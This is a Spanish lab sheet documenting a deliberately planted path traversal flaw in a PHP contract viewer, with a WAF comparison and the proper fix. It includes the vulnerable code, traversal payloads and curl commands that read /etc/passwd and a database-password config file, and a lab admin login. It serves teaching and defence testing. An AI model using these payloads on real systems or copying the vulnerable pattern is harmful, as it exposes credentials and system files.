# LAB-05 — Path Traversal en el visor de contratos

| Campo | Valor |
|---|---|
| **ID** | LAB-05 |
| **Tipo** | Path Traversal / Local File Inclusion (LFI) — Lectura de archivos |
| **Riesgo** | Alto |
| **CWE** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) |
| **OWASP** | A01:2021 — Broken Access Control |
| **Endpoint** | `GET /fa/sistemas/lab/documentos.php?archivo=` |
| **Acceso** | Requiere sesión iniciada (cualquier rol) |
| **Implementada** | 26 de septiembre de 2026 |

---

## 1. Qué hace

El visor de documentos abre contratos y pólizas a partir de un parámetro
`?archivo=` que se concatena directo a la ruta base
`lab/contratos/`. No hay `basename()`, no hay lista blanca y no hay `realpath()`
comparado contra el directorio: hay una concatenación y un `file_get_contents()`.

Con un `../` se sale del directorio de contratos. Con dos niveles se llega a la
raíz de la aplicación y se lee `config/db.php`, que contiene la contraseña de
MariaDB. Y con siete niveles se llega a la raíz del sistema de archivos, que es
donde aparece `/etc/passwd`. Ese último es el que demuestra el alcance completo;
el de la contraseña, el que se ve mejor en un video de treinta segundos.

También lee un archivo que **sí** está en el directorio, pero que la página no
ofrece: `confidencial-nomina.txt` existe en `lab/contratos/` y no aparece en el
catálogo, porque el catálogo (`lab_documentos`) tiene solo dos filas. Que el
archivo no esté en el menú no significa que no esté en el disco, y la aplicación
no comprueba el menú.

---

## 2. Dónde está el código

### 2.1 La concatenación vulnerable

`lab/documentos.php`, líneas 42 a 58:

```php
$ruta_base = __DIR__ . '/contratos/';

// Archivos que la pagina ofrece en el menu lateral.
$documentos = db_all(
    "SELECT archivo, descripcion FROM lab_documentos ORDER BY id"
);

// Valor por defecto cuando no se envia el parametro.
$archivo = input_get('archivo', 'contrato-servicios.txt');
if ($archivo === '') {
    $archivo = 'contrato-servicios.txt';
}

$ruta_completa = $ruta_base . $archivo;

$existe = is_file($ruta_completa) && is_readable($ruta_completa);
$contenido = $existe ? @file_get_contents($ruta_completa) : false;
```

`is_file()` y `is_readable()` comprueban la ruta **ya resuelta**: preguntan si el
archivo existe y se puede abrir, no si el usuario tiene permiso para verlo. Es
una comprobación de existencia, no de autorización, y por eso el `../../` la
atraviesa sin problema: el archivo existe, luego la lectura procede.

### 2.2 La salida

`lab/documentos.php`, línea 135:

```php
<div class="documento-vista"><?php echo $contenido; ?></div>
```

El contenido se imprime **sin escapar** (el resto de la página usa `e()`). Es
detalle secundario para esta ficha, pero conviene saberlo: además de leer
archivos, esta línea es una segunda puerta abierta.

### 2.3 La corrección que falta

El camino correcto, y que el propio archivo describe en su comentario de
cabecera, tiene tres pasos: quitar los directorios, validar contra una lista
blanca y confirmar con `realpath()` que la ruta final sigue dentro del base.

```php
$permitidos = array('contrato-servicios.txt', 'polizas.md');
$nombre = basename(input_get('archivo'));
if (!in_array($nombre, $permitidos, true)) {
    http_response_code(400);
    exit('Archivo no permitido.');
}
$ruta = realpath(DOC_ROOT . '/lab/contratos/' . $nombre);
if ($ruta === false || strpos($ruta, realpath(DOC_ROOT . '/lab/contratos')) !== 0) {
    http_response_code(403);
    exit('Ruta fuera del directorio permitido.');
}
```

El orden importa. `basename()` elimina cualquier secuencia de directorios que
haya llegado en el nombre. La lista blanca decide si ese nombre es uno de los
permitidos. `realpath()` resuelve la ruta real (symlinks incluidos) y la
comparación por prefijo con el directorio base es la que realmente cierra la
puerta. **Cualquier ruta que se salga del directorio se rechaza**, con código de
error y sin contenido.

---

## 3. Por qué existe en una app real

El módulo nació como un menú: una consulta a `lab_documentos` y dos enlaces.
Funcionaba y no exponía nada, porque el nombre del archivo lo ponía la propia
aplicación.

Después se añadió el campo de texto "Nombre del archivo" para poder abrir un
documento escribiendo su nombre, en lugar de navegar el menú. Ese es el momento
en que entró el parámetro, y entró como lo que era en ese momento: una cadena
que se concatena. La validación nunca se escribió porque el caso de uso legítimo
—escribir `polizas.md`— funcionaba sin ella. El código es idéntico al de un
visor de adjuntos escrito en 2012 que solo confiaba en que el usuario no
escribiera `../`.

Es el patrón más repetido del laboratorio: **una funcionalidad nueva legítima
añadida sobre un dato que el usuario controla**. La app no falló por lo que hace,
falla por lo que acepta.

---

## 4. Payloads

La ruta base es `/var/www/html/fa/sistemas/lab/contratos/`. Está a **7 niveles**
de la raíz del sistema de archivos:

```
/var/www/html/fa/sistemas/lab/contratos/
  1 → lab       3 → fa        5 → www     7 → /
  2 → sistemas  4 → html      6 → var
```

| # | `?archivo=` | Pasos | Resultado verificado |
|---:|---|---:|---|
| 1 | `contrato-servicios.txt` | — | **Control.** Abre el contrato del catálogo |
| 2 | `confidencial-nomina.txt` | 0 | Lee un archivo del directorio **que no está en el catálogo** (tabla de sueldos) |
| 3 | `../../config/db.php` | 2 | Lee la configuración y **expone la contraseña de MariaDB** |
| 4 | `../../../../../../../etc/passwd` | 7 | Lee `/etc/passwd` completo (verificado buscando `root:x:0:0`) |

El caso 3 es el más útil para el video: dos niveles, un archivo que pertenece a
la propia aplicación, y un resultado que es la credencial de la base de datos
escrita en el código. El caso 4 demuestra el alcance completo, y el caso 2
demuestra algo más incómodo: que la app tampoco restringe lo que tiene en su
propio directorio.

### Variante a mano

```bash
# 1. Control
curl -s --path-as-is -b cookies.txt \
  "http://localhost/fa/sistemas/lab/documentos.php?archivo=contrato-servicios.txt" | grep -c "CONTRATO"

# 2. Archivo fuera del catalogo, dentro del directorio
curl -s --path-as-is -b cookies.txt \
  "http://localhost/fa/sistemas/lab/documentos.php?archivo=confidencial-nomina.txt" | grep -c "TABLA DE SUELDOS"

# 3. Credenciales de MariaDB (2 niveles)
curl -s --path-as-is -b cookies.txt \
  "http://localhost/fa/sistemas/lab/documentos.php?archivo=../../config/db.php" | grep -c "DB_PASS"

# 4. Archivo del sistema (7 niveles)
curl -s --path-as-is -b cookies.txt \
  "http://localhost/fa/sistemas/lab/documentos.php?archivo=../../../../../../../etc/passwd" | grep -c "root:x:0:0"
```

### Importante: curl necesita `--path-as-is`

Todos los comandos de esta ficha usan `--path-as-is`, y no es cosmético.

**curl normaliza (colapsa) las secuencias `../` de la ruta de la URL antes de
enviarla**, salvo que se le indique lo contrario. Comprobado en este entorno con
curl 8.5.0: sin el flag, esta petición

```
GET /fa/sistemas/lab/contratos/../../../config/db.php
```

sale así al cable, ya colapsada:

```
GET /fa/config/db.php
```

y Apache responde `404 Not Found`. Con `--path-as-is` la ruta viaja exactamente
como se escribió.

En estos ejemplos la secuencia viaja en el valor de `?archivo=`, que curl no
reescribe, y por eso la matriz puede verificar los marcadores. Aun así, **usa
siempre el flag**: garantiza que la URL llega al servidor tal cual está escrita
y te quita la duda de si falló la prueba o falló el cliente. Sin él, un `404` se
lee como "la aplicación no es vulnerable", cuando lo que falló fue la
normalización del cliente antes de salir.

---

## 5. Escenario A vs Escenario B

El objetivo de la demostración es comparar el **mismo código** en los dos lados.

| Prueba | Escenario A (Apache directo) | Escenario B (SafeLine) |
|---|---|---|
| 1. `contrato-servicios.txt` (control) | Abre el documento | Abre el documento |
| 2. `polizas.md` (control) | Abre el documento | Abre el documento |
| 3. `confidencial-nomina.txt` | **Lee la tabla de sueldos** | **Bloqueado** |
| 4. `../../config/db.php` | **Expone la contraseña de la BD** | **Bloqueado** |
| 5. `../../../../../../../etc/passwd` | **Expone `/etc/passwd`** | **Bloqueado** |

Las dos primeras filas son el control: deben comportarse igual en ambos
escenarios, para demostrar que el WAF no rompe el uso normal.

### Sesión previa

```bash
curl -s -o /dev/null -c cookies.txt \
  --data-urlencode "username=admin" --data-urlencode "password=Admin_2026!" \
  http://localhost/fa/sistemas/login.php
```

### Escenario A — Apache directo

```bash
# Control
curl -s --path-as-is -b cookies.txt "http://localhost/fa/sistemas/lab/documentos.php?archivo=contrato-servicios.txt"

# Ataque 1: archivo del directorio que no esta en el catalogo
curl -s --path-as-is -b cookies.txt "http://localhost/fa/sistemas/lab/documentos.php?archivo=confidencial-nomina.txt" | grep -c "TABLA DE SUELDOS"

# Ataque 2: credenciales de MariaDB (2 niveles)
curl -s --path-as-is -b cookies.txt "http://localhost/fa/sistemas/lab/documentos.php?archivo=../../config/db.php" | grep -c "DB_PASS"

# Ataque 3: archivo del sistema (7 niveles)
curl -s --path-as-is -b cookies.txt "http://localhost/fa/sistemas/lab/documentos.php?archivo=../../../../../../../etc/passwd" | grep -c "root:x:0:0"
```

### Escenario B — detrás de SafeLine

Mismos comandos, mismo orden, solo cambia el host. SafeLine escuchará en el
puerto `8000` y reenviará a `http://127.0.0.1:80`. **Esta ejecución todavía no
se ha hecho**: SafeLine no está instalado y se desplegará después, en el VPS.

```bash
# Control
curl -s --path-as-is -b cookies.txt "http://192.168.100.22:8000/fa/sistemas/lab/documentos.php?archivo=contrato-servicios.txt"

# Ataque 1: archivo del directorio que no esta en el catalogo
curl -s --path-as-is -b cookies.txt "http://192.168.100.22:8000/fa/sistemas/lab/documentos.php?archivo=confidencial-nomina.txt" | grep -c "TABLA DE SUELDOS"

# Ataque 2: credenciales de MariaDB (2 niveles)
curl -s --path-as-is -b cookies.txt "http://192.168.100.22:8000/fa/sistemas/lab/documentos.php?archivo=../../config/db.php" | grep -c "DB_PASS"

# Ataque 3: archivo del sistema (7 niveles)
curl -s --path-as-is -b cookies.txt "http://192.168.100.22:8000/fa/sistemas/lab/documentos.php?archivo=../../../../../../../etc/passwd" | grep -c "root:x:0:0"
```

### Cómo lo verifica la matriz

`documents/lab_matrix.sh` ejecuta las nueve prácticas del laboratorio contra un
origen de destino. Para LAB-05 no adivina: **busca un marcador exacto** en el
cuerpo de la respuesta. Estos son los marcadores que usa, textuales:

| Prueba | Marcador exacto | Interpretación |
|---|---|---|
| Lectura de `/etc/passwd` | `root:x:0:0` | Si aparece, el archivo del sistema se leyó |
| Lectura de `config/db.php` | `DB_PASS` | Si aparece, el código de configuración de la BD está expuesto |

La prueba se considera exitosa solo si **los dos** marcadores aparecen
(`PASSWD > 0 && CREDS > 0`). La lógica se invierte con la bandera `--waf`: en
Escenario A la prueba debe pasar, en Escenario B debe fallar.

El tercer payload de la tabla —`confidencial-nomina.txt`— **no** lo cubre
`lab_matrix.sh`: es una prueba manual, y su verificación es el mismo estilo de
marcador (`TABLA DE SUELDOS` en la respuesta). Si la quieres automatizar, ese es
el `grep` que hay que añadir al script.

```bash
# Escenario A
./documents/lab_matrix.sh

# Escenario B
./documents/lab_matrix.sh http://192.168.100.22:8000/fa/sistemas --waf -v
```

---

## 6. Qué debería hacer SafeLine

SafeLine analiza el parámetro `archivo` de la petición `GET` y debe clasificar la
secuencia de directorios como recorrido de rutas **antes** de que la solicitud
llegue a Apache. La lectura nunca debe ocurrir: no hay que confiar en que la
página después decida mostrar un error bonito.

| Aspecto | Valor esperado |
|---|---|
| Regla activada | Path Traversal / LFI (parámetro `archivo`) |
| Modo recomendado | `Strict` |
| Respuesta | Página de bloqueo de SafeLine, no el visor de la app |
| Origen en la app | Ninguna: el request no debe llegar a `lab/documentos.php` |
| Efecto secundario esperado | `audit_log` no debe crecer con una fila `VIEW` por payload |

Ese último punto es la prueba de que el corte ocurrió **antes** de la
aplicación. `lab/documentos.php` registra cada documento abierto (línea 64:
`audit_log('VIEW', 'lab', ' consulted el documento ' . $archivo . ' ...')`). En
el Escenario A el conteo de filas `VIEW` crece con cada payload, porque la
petición entra a la app y se registra; en el Escenario B el conteo no debe
moverse:

```sql
SELECT COUNT(*) FROM audit_log WHERE accion = 'VIEW' AND modulo = 'lab';   -- repetir antes y despues del Escenario B
```

Una advertencia para cuando se grabe el video: el bloqueo de SafeLine se aplica
sobre la petición tal como llega por HTTP. Si el cliente collapse los `../`
antes de enviar (el caso de curl sin `--path-as-is`), SafeLine verá una URL
limpia y no tendrá nada que bloquear. **Usa `--path-as-is`** o la demostración
de Escenario B no significará nada.

---

## 7. Aislamiento de la vulnerabilidad

Regla del proyecto: **un solo punto vulnerable por práctica**, para que el
resultado de la matriz no se mezcle.

- `lab/documentos.php` es el único archivo que lee contenido del disco a partir
  de un parámetro de la petición.
- La concatenación ocurre en una sola línea: `$ruta_completa = $ruta_base .
  $archivo;` (línea 55). No hay otros `include` dinámicos en la aplicación.
- Los enlaces del menú lateral se construyen con `urlencode()` sobre nombres que
  vienen de `lab_documentos`, así que el recorrido no se puede originar desde la
  navegación normal: hay que escribirlo a mano.
- El resto de la aplicación no lee archivos controlables por el usuario: las
  subidas de LAB-06 se sirven desde `uploads/` con su propia validación de
  extensión, y el resto de módulos no hacen `file_get_contents()` con entrada
  externa.

---

## 8. La conclusión del laboratorio

SafeLine bloquea el ataque, y eso es una defensa real. Pero un WAF es una capa
adicional, no la solución: un recorrido de rutas no necesita un payload
sofisticado para tener éxito. Basta con una secuencia de `../` y con que la ruta
llegue al servidor tal cual, y eso depende de cómo esté escrito el cliente que
ataca. Un WAF que normaliza la URL antes de analizarla no está viendo el
ataque.

La corrección real está en el código, y son tres líneas: `basename()` para
quitar los directorios, una lista blanca de los dos archivos que el módulo
debe abrir, y `realpath()` comparado contra el directorio base para descartar
cualquier ruta que se salga. Con eso, `../../config/db.php` deja de ser un
archivo y pasa a ser un nombre de archivo que no está en la lista.

Dos ideas adicionales que la demo deja sobre la mesa: la línea 135 imprime
el contenido sin `e()`, y un recorrido de rutas combinado con eso convierte
leer un archivo en ejecutar JavaScript en el navegador de otro usuario. Son dos
prácticas distintas —esta es LAB-05 y el XSS es LAB-04— pero el arreglo es el
mismo estilo: no confiar en lo que llega del usuario, y no confiar en lo que sale
de un archivo.

Y una observación de arquitectura que vale para todo el laboratorio: el menú
lateral no es un mecanismo de seguridad. `lab_documentos` describe lo que la
página *ofrece*, no lo que la página *puede* abrir. La autorización tiene que
estar en el código, no en la lista de la base de datos.
